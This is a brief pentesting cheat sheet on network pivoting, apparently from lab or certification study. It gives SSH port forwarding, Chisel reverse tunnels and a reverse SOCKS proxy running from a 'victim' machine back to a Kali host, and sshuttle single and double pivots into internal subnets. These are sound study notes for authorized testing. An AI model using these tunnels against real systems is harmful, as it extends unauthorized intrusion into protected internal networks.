# Pivoting/Port Forwarding

### SSH

```bash
ssh user@10.10.11.208 -L 3000:127.0.0.1:3000
```

### Chisel

**prepend further commands with proxychains**

```bash
./chisel server -p 7777 --reverse # Kali machine
./chisel client 10.10.14.38:7777 R:8000:127.0.0.1:8000 # on Victim

# on kali
chisel server -p 8000 --reverse

# on victim
chisel client <kali IP>:8000 R:socks

# on kali (choose one)
socks4 127.0.0.1 9050 # more accurate but slower
socks5 127.0.0.1 1080 # faster but less accurate (might miss ports w/ nmap)
```

### SSHuttle

```bash
# single pivot
sudo sshuttle -r sean@10.11.1.251 10.1.1.0/24

# double pivot
sudo sshuttle -r sean@10.11.1.251 10.1.1.0/24
sudo sshuttle -r mario@10.1.1.1:222 10.3.3.0/24
```
